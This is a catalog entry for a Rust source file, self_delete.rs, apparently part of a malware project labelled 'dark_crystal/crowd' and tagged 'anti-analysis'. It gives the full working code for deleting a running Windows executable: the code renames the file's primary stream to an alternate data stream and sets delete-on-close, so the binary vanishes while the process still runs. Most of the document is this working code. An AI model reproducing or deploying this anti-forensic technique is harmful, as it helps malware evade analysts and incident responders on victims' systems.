# crowd — self_delete.rs  (🅱️ B TIER — Win32 file API for ADS rename, non-injection path)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/self_delete.rs` |
| **Lines** | 110 |
| **Tier** | W |
| **Cards** | T013-anti-analysis |
| **Role** | Self-deletion via ADS rename |
| **Unsafe blocks** | 1 |

## Purpose

# crowd — self_delete.rs  (🅱️ B TIER — Win32 file API for ADS rename, non-injection path)

Self-deletion via rename-to-alternate-data-stream + FileDispositionInfo.
Verbatim from killaofking/crates/core/src/experimental/self_deletion.rs

Technique:
1. Opens own executable with DELETE access.
2. Renames to a non-primary ADS (`:victor`) — makes the primary stream
unreachable by path, even while the handle is open.
3. Re-opens with DELETE, sets FILE_DISPOSITION_INFO (delete-on-close).
4. When handle is closed, the file is unlinked automatically by NTFS.

The file appears to delete WHILE the process is still running.

## Public API

### `delete_self` (line 29)
```rust
pub fn delete_self() -> anyhow::Result<()>
```

## Key Dependencies

- `use windows::core::PCWSTR;`
- `use windows::Win32::{`

## Full Source

```rust
//! # crowd — self_delete.rs  (🅱️ B TIER — Win32 file API for ADS rename, non-injection path)
//!
//! Self-deletion via rename-to-alternate-data-stream + FileDispositionInfo.
//! Verbatim from killaofking/crates/core/src/experimental/self_deletion.rs
//!
//! Technique:
//!   1. Opens own executable with DELETE access.
//!   2. Renames to a non-primary ADS (`:victor`) — makes the primary stream
//!      unreachable by path, even while the handle is open.
//!   3. Re-opens with DELETE, sets FILE_DISPOSITION_INFO (delete-on-close).
//!   4. When handle is closed, the file is unlinked automatically by NTFS.
//!
//! The file appears to delete WHILE the process is still running.

use std::ffi::c_void;
use std::mem::size_of;
use windows::core::PCWSTR;
use windows::Win32::{
    Foundation::CloseHandle,
    Storage::FileSystem::{
        CreateFileW, SetFileInformationByHandle, FILE_RENAME_INFO,
        FileDispositionInfo, FileRenameInfo,
        DELETE, FILE_DISPOSITION_INFO, FILE_FLAGS_AND_ATTRIBUTES, FILE_SHARE_READ,
        OPEN_EXISTING, SYNCHRONIZE,
    },
    System::Memory::{GetProcessHeap, HeapAlloc, HeapFree, HEAP_FLAGS, HEAP_ZERO_MEMORY},
};

pub fn delete_self() -> anyhow::Result<()> {
    let stream = ":victor";
    let stream_wide: Vec<u16> = stream.encode_utf16().chain(Some(0)).collect();

    unsafe {
        let mut delete_file = FILE_DISPOSITION_INFO::default();
        let len = size_of::<FILE_RENAME_INFO>() + (stream_wide.len() * size_of::<u16>());
        let heap = GetProcessHeap()?;
        let rename_info =
            HeapAlloc(heap, HEAP_ZERO_MEMORY, len) as *mut FILE_RENAME_INFO;
        if rename_info.is_null() {
            return Err(anyhow::anyhow!("HeapAlloc for FILE_RENAME_INFO failed"));
        }

        // Ensure HeapFree runs on all paths (including early ? returns)
        let result = (|| -> anyhow::Result<()> {
            delete_file.DeleteFile = true.into();
            (*rename_info).FileNameLength = (stream_wide.len() * size_of::<u16>()) as u32 - 2;
            std::ptr::copy_nonoverlapping(
                stream_wide.as_ptr(),
                (*rename_info).FileName.as_mut_ptr(),
                stream_wide.len(),
            );

            let path = std::env::current_exe()?;
            let path_str = path
                .to_str()
                .ok_or_else(|| anyhow::anyhow!("path not valid UTF-8"))?;
            let full_path: Vec<u16> = path_str.encode_utf16().chain(Some(0)).collect();

            // Step 1: rename primary stream to ADS
            let h = CreateFileW(
                PCWSTR(full_path.as_ptr()),
                DELETE.0 | SYNCHRONIZE.0,
                FILE_SHARE_READ,
                None,
                OPEN_EXISTING,
                FILE_FLAGS_AND_ATTRIBUTES(0),
                None,
            )?;
            let rename_result = SetFileInformationByHandle(h, FileRenameInfo, rename_info as *const c_void, len as u32);
            if let Err(e) = rename_result {
                let _ = CloseHandle(h);
                return Err(e.into());
            }
            CloseHandle(h)?;

            // Step 2: mark for deletion — after ADS rename, re-open using the
            // ADS path (original_path + ":victor") since the primary stream was
            // renamed and the original DOS path may no longer resolve correctly.
            let ads_path_str = format!("{}:{}", path_str, "victor");
            let ads_path: Vec<u16> = ads_path_str.encode_utf16().chain(Some(0)).collect();

            let h2 = CreateFileW(
                PCWSTR(ads_path.as_ptr()),
                DELETE.0 | SYNCHRONIZE.0,
                FILE_SHARE_READ,
                None,
                OPEN_EXISTING,
                FILE_FLAGS_AND_ATTRIBUTES(0),
                None,
            )?;
            let disp_result = SetFileInformationByHandle(
                h2,
                FileDispositionInfo,
                &delete_file as *const FILE_DISPOSITION_INFO as _,
                std::mem::size_of_val(&delete_file) as u32,
            );
            if let Err(e) = disp_result {
                let _ = CloseHandle(h2);
                return Err(e.into());
            }
            CloseHandle(h2)?;

            Ok(())
        })();

        // Always free the heap buffer, regardless of success/failure above
        let _ = HeapFree(heap, HEAP_FLAGS(0), Some(rename_info as *const c_void));
        result
    }
}

```